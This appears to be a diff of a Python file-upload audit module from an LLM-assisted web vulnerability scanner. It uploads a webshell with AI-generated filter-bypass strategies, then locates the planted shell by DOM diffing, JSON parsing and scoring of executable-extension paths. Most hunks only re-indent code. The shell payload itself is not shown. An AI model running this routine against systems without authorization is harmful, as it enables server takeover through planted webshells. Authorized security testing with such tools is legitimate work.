@@ -235,6 +235,12 @@ class UnifiedUploadAuditModule(BaseModule):
 
             # ── 先传一个无害测试文件，摸底文件存储路径规律 ─────────
 
+            for strat_idx, strategy in enumerate(strategies, 1):
+                strat_name = strategy.name
+                suffix = strategy.filename_suffix
+                content_type = strategy.content_type
+                print(f"\n    → [Round {strat_idx}/{len(strategies)}] 执行策略: '{strat_name}' | 文件名: {filename} | Content-Type: {content_type}")
+
                 # 发送物理上传请求
                 resp = self._send_upload(action_url, file_param, filename, self.webshell_content, content_type, form_data)
                 if not resp:
@@ -343,13 +349,13 @@ class UnifiedUploadAuditModule(BaseModule):
         """调用 Strategy Agent 动态生成最佳绕过策略。若 LLM 失败则退回基础备用策略。"""
         try:
             res: StrategyGenerationResult = self._strategy_chain.invoke({
-                "action_url": action_url,
-                "file_param": file_param,
-                "accept_types": ", ".join(accept_types) if accept_types else "无限制",
-                "page_title": page_title,
+                    "action_url": action_url,
+                    "file_param": file_param,
+                    "accept_types": ", ".join(accept_types) if accept_types else "无限制",
+                    "page_title": page_title,
             })
             if res and res.strategies:
-                return res.strategies
+                    return res.strategies
         except Exception as e:
             print(f"  [StrategyAgent] LLM 生成策略失败 ({e})，降级为默认策略库。")
 
@@ -383,12 +389,12 @@ class UnifiedUploadAuditModule(BaseModule):
         if getattr(resp, "request", None) and resp.request.url:
             req_url = resp.request.url
             if req_url != resp.url and req_url not in candidates:
-                candidates.append(req_url)
+                    candidates.append(req_url)
 
         # 3. 跳转链中所有中间页
         for h in (resp.history or []):
             if h.url and h.url not in candidates:
-                candidates.append(h.url)
+                    candidates.append(h.url)
 
         # 4. 上传端点兜底
         if action_url and action_url not in candidates:
@@ -398,10 +404,10 @@ class UnifiedUploadAuditModule(BaseModule):
         ordered: List[str] = []
         for c in [resp.url, action_url]:
             if c and c in candidates:
-                ordered.append(c)
+                    ordered.append(c)
         for c in candidates:
             if c not in ordered:
-                ordered.append(c)
+                    ordered.append(c)
 
         return ordered[:4]  # 最多 4 个目标，保持速度
 
@@ -420,18 +426,18 @@ class UnifiedUploadAuditModule(BaseModule):
         # 1. LLM 从上传响应中寻找路径
         if len(resp.text) >= 10:
             try:
-                extract_res: ExtractPathResult = self._path_chain.invoke({
-                    "filename": filename,
-                    "status_code": resp.status_code,
-                    "response_body": resp.text[:2000]
-                })
-                if extract_res and extract_res.extracted_path:
-                    ep = extract_res.extracted_path.strip()
-                    if "/" in ep or "." in ep:
-                        print(f"      [LLM PathAgent] 从响应中解析出路径: {ep}")
-                        return ep
+                    extract_res: ExtractPathResult = self._path_chain.invoke({
+                        "filename": filename,
+                        "status_code": resp.status_code,
+                        "response_body": resp.text[:2000]
+                    })
+                    if extract_res and extract_res.extracted_path:
+                        ep = extract_res.extracted_path.strip()
+                        if "/" in ep or "." in ep:
+                            print(f"      [LLM PathAgent] 从响应中解析出路径: {ep}")
+                            return ep
             except Exception as e:
-                pass
+                    pass
 
         # 2. 上传后重新渲染目标页面，抓取新 DOM 做差异对比
         time.sleep(0.3)
@@ -443,11 +449,11 @@ class UnifiedUploadAuditModule(BaseModule):
 
         for target in post_targets:
             try:
-                html_text = self.requester.fetch_rendered_html(target)
-                if html_text:
-                    after_links.update(self._extract_all_links(html_text))
+                    html_text = self.requester.fetch_rendered_html(target)
+                    if html_text:
+                        after_links.update(self._extract_all_links(html_text))
             except Exception:
-                pass
+                    pass
 
         new_links_set = after_links - baseline_links
 
@@ -469,9 +475,9 @@ class UnifiedUploadAuditModule(BaseModule):
             core_name = filename.split("_")[0]
             match = re.search(r'[\'"]([^\'"]*' + re.escape(core_name) + r'[^\'"]*)[\'"]', resp.text)
             if match:
-                path = match.group(1)
-                print(f"      [Regex Fallback] 提取到关联文件名路径: {path}")
-                return path
+                    path = match.group(1)
+                    print(f"      [Regex Fallback] 提取到关联文件名路径: {path}")
+                    return path
         except Exception:
             pass
 
@@ -485,56 +491,56 @@ class UnifiedUploadAuditModule(BaseModule):
             ignore_kw = ["jquery", "bootstrap", "sweetalert", "datatables", "vendor/", "cdn", "jsdelivr", "/js/", "/images/", "/css/"]
 
             for page_url in observation_pages:
-                if not page_url or page_url == source_page or page_url == action_url:
-                    continue  # 已扫过
-                try:
-                    page_html = self.requester.fetch_rendered_html(page_url)
-                    if not page_html:
-                        continue
-                    page_links = self._extract_all_links(page_html)
-                    for link in page_links:
-                        if any(kw in link.lower() for kw in ignore_kw):
+                    if not page_url or page_url == source_page or page_url == action_url:
+                        continue  # 已扫过
+                    try:
+                        page_html = self.requester.fetch_rendered_html(page_url)
+                        if not page_html:
                             continue
-                        if any(ud in link.lower() for ud in upload_dirs) and any(
-                            ext in link.lower() for ext in shell_exts
-                        ):
-                            # 如果文件名包含 UUID 前缀则优先返回
-                            base_name = link.split('?')[0].rsplit('/', 1)[-1].lower()
-                            if original_filename and original_filename.split('_')[0].lower() in base_name:
-                                print(f"      [已知页面扫描] 命中 UUID 前缀匹配: {link}")
+                        page_links = self._extract_all_links(page_html)
+                        for link in page_links:
+                            if any(kw in link.lower() for kw in ignore_kw):
+                                continue
+                            if any(ud in link.lower() for ud in upload_dirs) and any(
+                                ext in link.lower() for ext in shell_exts
+                            ):
+                                # 如果文件名包含 UUID 前缀则优先返回
+                                base_name = link.split('?')[0].rsplit('/', 1)[-1].lower()
+                                if original_filename and original_filename.split('_')[0].lower() in base_name:
+                                    print(f"      [已知页面扫描] 命中 UUID 前缀匹配: {link}")
+                                    return link
+                                # 否则返回第一个上传目录中的可执行文件（大概率就是上传的文件）
+                                print(f"      [已知页面扫描] 找到可执行文件: {link}")
+                                if original_filename.split('_')[0].lower() not in base_name:
+                                    continue  # 不是目标文件，继续
                                 return link
-                            # 否则返回第一个上传目录中的可执行文件（大概率就是上传的文件）
-                            print(f"      [已知页面扫描] 找到可执行文件: {link}")
-                            if original_filename.split('_')[0].lower() not in base_name:
-                                continue  # 不是目标文件，继续
-                            return link
-                except Exception:
-                    continue
+                    except Exception:
+                        continue
 
             # 5b. 如果 UUID 前缀匹配失败，返回上传目录 + 可执行扩展名的第一个结果
             for page_url in observation_pages:
-                if not page_url or page_url == source_page or page_url == action_url:
-                    continue
-                try:
-                    page_html = self.requester.fetch_rendered_html(page_url)
-                    if not page_html:
+                    if not page_url or page_url == source_page or page_url == action_url:
                         continue
-                    page_links = self._extract_all_links(page_html)
-                    for link in page_links:
-                        if any(kw in link.lower() for kw in ignore_kw):
+                    try:
+                        page_html = self.requester.fetch_rendered_html(page_url)
+                        if not page_html:
                             continue
-                        if any(ud in link.lower() for ud in upload_dirs):
-                            exts_to_check = ['.php', '.phtml', '.php3', '.php4', '.php5', '.phar', '.jsp', '.jspx', '.shtml']
-                            if any(ext in link.lower() for ext in exts_to_check):
-                                print(f"      [已知页面扫描 5b] 找到上传目录可执行文件: {link}")
-                                return link
-                except Exception:
-                    continue
+                        page_links = self._extract_all_links(page_html)
+                        for link in page_links:
+                            if any(kw in link.lower() for kw in ignore_kw):
+                                continue
+                            if any(ud in link.lower() for ud in upload_dirs):
+                                exts_to_check = ['.php', '.phtml', '.php3', '.php4', '.php5', '.phar', '.jsp', '.jspx', '.shtml']
+                                if any(ext in link.lower() for ext in exts_to_check):
+                                    print(f"      [已知页面扫描 5b] 找到上传目录可执行文件: {link}")
+                                    return link
+                    except Exception:
+                        continue
 
         return None
 
     def _extract_path_via_dom_diff(self, new_links_set: set, baseline_links: Set[str],
-                                    original_filename: str, resp: Any) -> Optional[str]:
+                                        original_filename: str, resp: Any) -> Optional[str]:
         """
         从新增链接和上传响应 JSON 中提取文件路径。
 
@@ -553,61 +559,61 @@ class UnifiedUploadAuditModule(BaseModule):
         json_text = resp.text if hasattr(resp, 'text') else ''
         if len(json_text) > 5 and ('{' in json_text or '[' in json_text):
             try:
-                import json
-                parsed = json.loads(json_text)
-                found_urls = self._extract_urls_from_json(parsed)
-                for url in found_urls:
-                    # 排除 CDN / JS / Vendor 等静态资源
-                    if ("/" in url or "." in url) and not any(
-                        kw in url.lower() for kw in ["jquery", "bootstrap", "sweetalert", "datatables",
-                        "vendor/", "cdn", "jsdelivr", "/js/", "/images/", "/css/"]
-                    ):
-                        # 验证包含可执行文件扩展名
-                        base_name = url.split('?')[0].rsplit('/', 1)[-1]
-                        shell_exts = ['.php', '.phtml', '.php3', '.php4', '.php5',
-                                      '.phar', '.jsp', '.jspx', '.shtml', '.asp', '.aspx']
-                        if any(base_name.lower().endswith(ext) for ext in shell_exts) or '.' in base_name:
-                            print(f"      [DomDiff JSON] 从响应体提取文件路径: {url}")
-                            return url
+                    import json
+                    parsed = json.loads(json_text)
+                    found_urls = self._extract_urls_from_json(parsed)
+                    for url in found_urls:
+                        # 排除 CDN / JS / Vendor 等静态资源
+                        if ("/" in url or "." in url) and not any(
+                            kw in url.lower() for kw in ["jquery", "bootstrap", "sweetalert", "datatables",
+                            "vendor/", "cdn", "jsdelivr", "/js/", "/images/", "/css/"]
+                        ):
+                            # 验证包含可执行文件扩展名
+                            base_name = url.split('?')[0].rsplit('/', 1)[-1]
+                            shell_exts = ['.php', '.phtml', '.php3', '.php4', '.php5',
+                                          '.phar', '.jsp', '.jspx', '.shtml', '.asp', '.aspx']
+                            if any(base_name.lower().endswith(ext) for ext in shell_exts) or '.' in base_name:
+                                print(f"      [DomDiff JSON] 从响应体提取文件路径: {url}")
+                                return url
             except (json.JSONDecodeError, ValueError):
-                pass
+                    pass
             # JSON 解析失败 → 尝试正则匹配
             import re
             json_paths = re.findall(
-                r'(?:url|path|filepath|file_url|source|src|link)\s*[:=]\s*["\x27]([^"\x27]+\.[a-z]+)["\x27]',
-                json_text, re.IGNORECASE
+                    r'(?:url|path|filepath|file_url|source|src|link)\s*[:=]\s*["\x27]([^"\x27]+\.[a-z]+)["\x27]',
+                    json_text, re.IGNORECASE
             )
             for jp in json_paths:
-                if any(ud in jp.lower() for ud in ['/uploads/', '/files/', '/tmp/', '/upload/', '/media/']) or any(
-                    jp.lower().endswith(ext) for ext in ['.php', '.phtml', '.php3', '.php4', '.php5', '.phar']
-                ):
-                    print(f"      [DomDiff JSON Regex] 从响应正文提取路径: {jp}")
-                    return jp
+                    if any(ud in jp.lower() for ud in ['/uploads/', '/files/', '/tmp/', '/upload/', '/media/']) or any(
+                        jp.lower().endswith(ext) for ext in ['.php', '.phtml', '.php3', '.php4', '.php5', '.phar']
+                    ):
+                        print(f"      [DomDiff JSON Regex] 从响应正文提取路径: {jp}")
+                        return jp
 
         shell_extensions = ['.php', '.phtml', '.php3', '.php4', '.php5', '.phar',
-                            '.jsp', '.jspx', '.asp', '.aspx', '.shtml']
+                                '.jsp', '.jspx', '.asp', '.aspx', '.shtml']
         upload_dirs = ['/uploads/', '/files/', '/tmp/', '/upload/', '/media/',
-                       '/attachments/', '/user_files/',
-                       '/data/', '/storage/']
+                           '/attachments/', '/user_files/',
+                           '/data/', '/storage/']
         image_exts = ['.jpg', '.jpeg', '.png', '.gif', '.webp', '.bmp']
 
         # ── 策略 1: 上传目录 + 可执行扩展名（强信号） ──
         for link in sorted(new_links_set):
             if any(ud in link.lower() for ud in upload_dirs) and any(ext in link.lower() for ext in shell_extensions):
-                print(f"      [DomDiff Heuristic] 上传目录+可执行扩展名: {link}")
-                return link
+                    print(f"      [DomDiff Heuristic] 上传目录+可执行扩展名: {link}")
+                    return link
 
         # ── 策略 2: 图像混合扩展名在上传目录中 (.jpg.php .png.php) ──
         for link in sorted(new_links_set):
             if any(ud in link.lower() for ud in upload_dirs):
-                base_name = link.split('?')[0].split('/')[-1]
-                # 检查是否有 图片扩展名 + 可执行扩展名的混合后缀
-                if any(ext in base_name.lower() for ext in image_exts):
-                    # 提取最后一个点号之后的扩展名
-                    last_ext = '.' + base_name.split('.')[-1]
-                    if any(last_ext in ext for ext in shell_extensions):
-                        print(f"      [DomDiff Heuristic] 图像混合扩展名: {link}")
-                        return link
+                    base_name = link.split('?')[0].split('/')[-1]
+                    # 检查是否有 图片扩展名 + 可执行扩展名的混合后缀
+                    if any(ext in base_name.lower() for ext in image_exts):
+                        # 提取最后一个点号之后的扩展名
+                        last_ext = '.' + base_name.split('.')[-1]
+                        if any(last_ext in ext for ext in shell_extensions):
+                            print(f"      [DomDiff Heuristic] 图像混合扩展名: {link}")
+                            return link
 
         # ── 策略 3: UUID 前缀部分匹配（容忍重命名截断） ──
         # 原文件名 split("_")[0] 是 UUID，重命名后可能被去掉或替换。
@@ -615,23 +621,23 @@ class UnifiedUploadAuditModule(BaseModule):
         uuid_prefix = original_filename.split("_")[0] if "_" in original_filename else ""
         if uuid_prefix and len(uuid_prefix) >= 4:
             for link in sorted(new_links_set):
-                # 部分匹配: UUID 前缀的前半部分
-                partial = uuid_prefix[:4]
-                has_partial = partial in link.lower()
-                # 或者新路径包含时间戳特征（连续 8+ 位数字）
-                import re
-                has_timestamp = bool(re.search(r'\d{8,}', link))
-                has_shell_ext = any(ext in link.lower() for ext in shell_extensions)
-                if (has_partial or has_timestamp) and has_shell_ext:
-                    print(f"      [DomDiff Heuristic] 后缀/时间戳部分匹配: {link} (partial={partial} ts={has_timestamp})")
-                    return link
+                    # 部分匹配: UUID 前缀的前半部分
+                    partial = uuid_prefix[:4]
+                    has_partial = partial in link.lower()
+                    # 或者新路径包含时间戳特征（连续 8+ 位数字）
+                    import re
+                    has_timestamp = bool(re.search(r'\d{8,}', link))
+                    has_shell_ext = any(ext in link.lower() for ext in shell_extensions)
+                    if (has_partial or has_timestamp) and has_shell_ext:
+                        print(f"      [DomDiff Heuristic] 后缀/时间戳部分匹配: {link} (partial={partial} ts={has_timestamp})")
+                        return link
 
         # ── 策略 4: 任何在上传目录中的可执行扩展名文件（宽松兜底） ──
         for link in sorted(new_links_set):
             if any(ud in link.lower() for ud in upload_dirs):
-                if any(ext in link.lower() for ext in shell_extensions):
-                    print(f"      [DomDiff Fallback] 上传目录可执行文件: {link}")
-                    return link
+                    if any(ext in link.lower() for ext in shell_extensions):
+                        print(f"      [DomDiff Fallback] 上传目录可执行文件: {link}")
+                        return link
 
         return None
 
@@ -658,20 +664,20 @@ class UnifiedUploadAuditModule(BaseModule):
             full_url = urllib.parse.urljoin(source_page or action_url, path)
             print(f"      [探路] 尝试访问: {full_url}")
             try:
-                test_resp = self.requester.get(full_url)
-                if test_resp and "TEST_PROBE_MARKER_A1B2C3" in test_resp.text:
-                    print(f"      [探路✅] 成功！测试文件可访问，URL: {full_url}")
-                    # 保存测试文件的文件名和后缀，用于后续文件命名推断
-                    self._test_file_info = {"url": full_url, "filename": test_filename, "action_url": action_url}
-                    return full_url
-                elif test_resp and test_resp.status_code == 200:
-                    print(f"      [探路✅] 文件存在但探针未执行（可能是静态文件/重命名）。URL: {full_url}")
-                    self._test_file_info = {"url": full_url, "filename": test_filename, "action_url": action_url, "status_code": test_resp.status_code}
-                    return full_url
-                else:
-                    print(f"      [探路] 文件返回 {test_resp.status_code if test_resp else 'None'}，可能 404。")
+                    test_resp = self.requester.get(full_url)
+                    if test_resp and "TEST_PROBE_MARKER_A1B2C3" in test_resp.text:
+                        print(f"      [探路✅] 成功！测试文件可访问，URL: {full_url}")
+                        # 保存测试文件的文件名和后缀，用于后续文件命名推断
+                        self._test_file_info = {"url": full_url, "filename": test_filename, "action_url": action_url}
+                        return full_url
+                    elif test_resp and test_resp.status_code == 200:
+                        print(f"      [探路✅] 文件存在但探针未执行（可能是静态文件/重命名）。URL: {full_url}")
+                        self._test_file_info = {"url": full_url, "filename": test_filename, "action_url": action_url, "status_code": test_resp.status_code}
+                        return full_url
+                    else:
+                        print(f"      [探路] 文件返回 {test_resp.status_code if test_resp else 'None'}，可能 404。")
             except Exception:
-                pass
+                    pass
 
         print(f"      [探路] 未能从上传响应中定位路径，尝试扫描已知页面...")
         # 扫描已知页面找测试文件
@@ -680,29 +686,29 @@ class UnifiedUploadAuditModule(BaseModule):
 
         for page_url in observation_pages:
             if not page_url or page_url == source_page or page_url == action_url:
-                continue
-            try:
-                page_html = self.requester.fetch_rendered_html(page_url)
-                if not page_html:
                     continue
-                page_links = self._extract_all_links(page_html)
-                for link in page_links:
-                    # 检查链接是否包含测试文件命名特征（UUID_0 格式的后半部分）
-                    if "/uploads/" in link.lower() or "/files/" in link.lower() or "/upload/" in link.lower():
-                        # 尝试访问该 URL 看是否包含探针标记
-                        full_test_url = urllib.parse.urljoin(page_url, link)
-                        try:
-                            test_resp = self.requester.get(full_test_url)
-                            if test_resp and "TEST_PROBE_MARKER_A1B2C3" in test_resp.text:
-                                print(f"      [探路✅] 在页面 {page_url} 中找到测试文件: {full_test_url}")
-                                test_file_info = {"url": full_test_url, "filename": test_filename, "action_url": action_url}
-                                break
-                        except Exception:
-                            pass
-                if test_file_info:
-                    break
+            try:
+                    page_html = self.requester.fetch_rendered_html(page_url)
+                    if not page_html:
+                        continue
+                    page_links = self._extract_all_links(page_html)
+                    for link in page_links:
+                        # 检查链接是否包含测试文件命名特征（UUID_0 格式的后半部分）
+                        if "/uploads/" in link.lower() or "/files/" in link.lower() or "/upload/" in link.lower():
+                            # 尝试访问该 URL 看是否包含探针标记
+                            full_test_url = urllib.parse.urljoin(page_url, link)
+                            try:
+                                test_resp = self.requester.get(full_test_url)
+                                if test_resp and "TEST_PROBE_MARKER_A1B2C3" in test_resp.text:
+                                    print(f"      [探路✅] 在页面 {page_url} 中找到测试文件: {full_test_url}")
+                                    test_file_info = {"url": full_test_url, "filename": test_filename, "action_url": action_url}
+                                    break
+                            except Exception:
+                                pass
+                    if test_file_info:
+                        break
             except Exception:
-                continue
+                    continue
 
         if test_file_info:
             self._test_file_info = test_file_info
@@ -745,9 +751,9 @@ class UnifiedUploadAuditModule(BaseModule):
             # 尝试提取路径前缀（到最后一个 / 为止）
             path_parts = test_path.rsplit("/", 1)
             if len(path_parts) == 2:
-                upload_path_prefix = path_parts[0] + "/"
+                    upload_path_prefix = path_parts[0] + "/"
             else:
-                return None
+                    return None
         else:
             # 保留 /uploads/ 目录结构
             import os
@@ -770,19 +776,19 @@ class UnifiedUploadAuditModule(BaseModule):
         try:
             resp = self.requester.get(webshell_url)
             if not resp:
-                return DiagnosticResult(
-                    status="PATH_404",
-                    is_vuln=False,
-                    explanation="访问 Webshell 目标 URL 无响应",
-                    recommended_action="检查网络连通性或路径格式"
-                )
+                    return DiagnosticResult(
+                        status="PATH_404",
+                        is_vuln=False,
+                        explanation="访问 Webshell 目标 URL 无响应",
+                        recommended_action="检查网络连通性或路径格式"
+                    )
 
             # 调用 Diagnostic Agent 进行语义诊断
             diag_res: DiagnosticResult = self._diag_chain.invoke({
-                "filename": filename,
-                "webshell_url": webshell_url,
-                "status_code": resp.status_code,
-                "response_text": resp.text[:1500] if resp.text else "(Empty Body)"
+                    "filename": filename,
+                    "webshell_url": webshell_url,
+                    "status_code": resp.status_code,
+                    "response_text": resp.text[:1500] if resp.text else "(Empty Body)"
             })
             return diag_res
 
@@ -806,13 +812,13 @@ class UnifiedUploadAuditModule(BaseModule):
         soup = BeautifulSoup(html_content, "html.parser")
         for tag in soup.find_all(True):
             for attr in ["src", "href", "data-src", "data-url", "data-file"]:
-                link = tag.get(attr)
-                if link and isinstance(link, str):
-                    links.add(link)
+                    link = tag.get(attr)
+                    if link and isinstance(link, str):
+                        links.add(link)
         pattern = r'[\'"](/[^ \'"<>\n]+\.[a-zA-Z0-9]+)[\'"]|[\'"](http[^\'"<>\n]+\.[a-zA-Z0-9]+)[\'"]'
         for match in re.findall(pattern, html_content):
             for m in match:
-                if m: links.add(m)
+                    if m: links.add(m)
         return links
 
     def _find_best_shell_path(self, before_links: Set[str], after_links: Set[str], original_filename: str) -> Optional[str]:
@@ -836,9 +842,9 @@ class UnifiedUploadAuditModule(BaseModule):
 
         best_path, max_score = None, -1
         shell_extensions = ['.php', '.phtml', '.php3', '.php4', '.php5', '.phar', '.inc',
-                            '.jsp', '.jspx', '.asp', '.aspx', '.shtml']
+                                '.jsp', '.jspx', '.asp', '.aspx', '.shtml']
         upload_dirs = ['/uploads/', '/files/', '/tmp/', '/upload/', '/media/',
-                       '/attachments/', '/user_files/', '/data/', '/storage/']
+                           '/attachments/', '/user_files/', '/data/', '/storage/']
         image_exts = ['.jpg', '.jpeg', '.png', '.gif', '.webp', '.bmp']
 
         uuid_prefix = original_filename.split("_")[0] if "_" in original_filename else ""
@@ -848,31 +854,31 @@ class UnifiedUploadAuditModule(BaseModule):
             link_lower = link.lower()
 
             if any(ud in link_lower for ud in upload_dirs):
-                score += 10
+                    score += 10
             if any(ext in link_lower for ext in shell_extensions):
-                score += 10
+                    score += 10
             # 图像混合扩展名（如 shell.jpg.php），配合绕过测试
             if '.' in link:
-                base_name = link.split('?')[0].split('/')[-1]
-                if any(ext in base_name.lower() for ext in image_exts):
-                    score += 10
+                    base_name = link.split('?')[0].split('/')[-1]
+                    if any(ext in base_name.lower() for ext in image_exts):
+                        score += 10
             # 短路径更可能是直接上传（非深层 CMS 路径）
             if link.count('/') <= 4:
-                score += 5
+                    score += 5
             # 无查询字符串通常表示磁盘上的静态文件
             if '?' not in link:
-                score += 3
+                    score += 3
             # UUID 前缀未丢失时额外 +20
             if uuid_prefix and uuid_prefix in link:
-                score += 20
+                    score += 20
 
             if score > max_score:
-                max_score, best_path = score, link
+                    max_score, best_path = score, link
 
         return best_path if max_score > 0 else None
 
     def _find_fallback_shell_path(self, before_links: Set[str], after_links: Set[str],
-                                   strat_name: str, _min_score: int = 10) -> Optional[str]:
+                                       strat_name: str, _min_score: int = 10) -> Optional[str]:
         """
         宽松兜底：评分排序替代无序 set 的 first-match-wins。
         需要至少一个强信号（上传目录 OR 扩展名）才返回。
@@ -889,11 +895,11 @@ class UnifiedUploadAuditModule(BaseModule):
             score = 0
             link_lower = link.lower()
             if any(ud in link_lower for ud in upload_dirs):
-                score += 5
+                    score += 5
             if any(ext in link_lower for ext in shell_extensions):
-                score += 5
+                    score += 5
             if score > max_score:
-                max_score, best_path = score, link
+                    max_score, best_path = score, link
 
         return best_path if max_score >= _min_score else None
 
@@ -906,8 +912,8 @@ class UnifiedUploadAuditModule(BaseModule):
             pages.add(form.get("referer_url"))
         for page_url in [url, form.get("referer_url"), form.get("found_on_page")]:
             if page_url:
-                parent_dir = urllib.parse.urljoin(page_url, ".")
-                if parent_dir: pages.add(parent_dir)
+                    parent_dir = urllib.parse.urljoin(page_url, ".")
+                    if parent_dir: pages.add(parent_dir)
         res = [p for p in pages if p]
         return res[:10]
 
@@ -916,11 +922,11 @@ class UnifiedUploadAuditModule(BaseModule):
         baseline_links = set()
         for obs_page in observation_pages:
             try:
-                html_text = self.requester.fetch_rendered_html(obs_page)
-                if html_text:
-                    baseline_links.update(self._extract_all_links(html_text))
+                    html_text = self.requester.fetch_rendered_html(obs_page)
+                    if html_text:
+                        baseline_links.update(self._extract_all_links(html_text))
             except Exception:
-                pass
+                    pass
         return baseline_links
 
     def _extract_extra_form_fields(self, source_page: str, action_url: str) -> Dict[str, str]:
@@ -929,13 +935,13 @@ class UnifiedUploadAuditModule(BaseModule):
         try:
             resp = self.requester.get(source_page)
             if resp:
-                soup = BeautifulSoup(resp.text, "html.parser")
-                for f_tag in soup.find_all("form"):
-                    if f_tag.get("action", "") in action_url or action_url in f_tag.get("action", ""):
-                        for inp in f_tag.find_all("input"):
-                            if inp.get("type", "text") != "file" and inp.get("name"):
-                                form_data[inp["name"]] = inp.get("value", "test_val")
-                        break
+                    soup = BeautifulSoup(resp.text, "html.parser")
+                    for f_tag in soup.find_all("form"):
+                        if f_tag.get("action", "") in action_url or action_url in f_tag.get("action", ""):
+                            for inp in f_tag.find_all("input"):
+                                if inp.get("type", "text") != "file" and inp.get("name"):
+                                    form_data[inp["name"]] = inp.get("value", "test_val")
+                            break
         except Exception:
             pass
         return form_data
@@ -949,11 +955,11 @@ class UnifiedUploadAuditModule(BaseModule):
         urls: List[str] = []
         if isinstance(obj, dict):
             for k, v in obj.items():
-                if isinstance(v, str) and ('/' in v or 'http' in v.lower()):
-                    urls.append(v)
-                else:
-                    urls.extend(self._extract_urls_from_json(v, depth + 1))
+                    if isinstance(v, str) and ('/' in v or 'http' in v.lower()):
+                        urls.append(v)
+                    else:
+                        urls.extend(self._extract_urls_from_json(v, depth + 1))
         elif isinstance(obj, list):
             for item in obj:
-                urls.extend(self._extract_urls_from_json(item, depth + 1))
+                    urls.extend(self._extract_urls_from_json(item, depth + 1))
         return urls
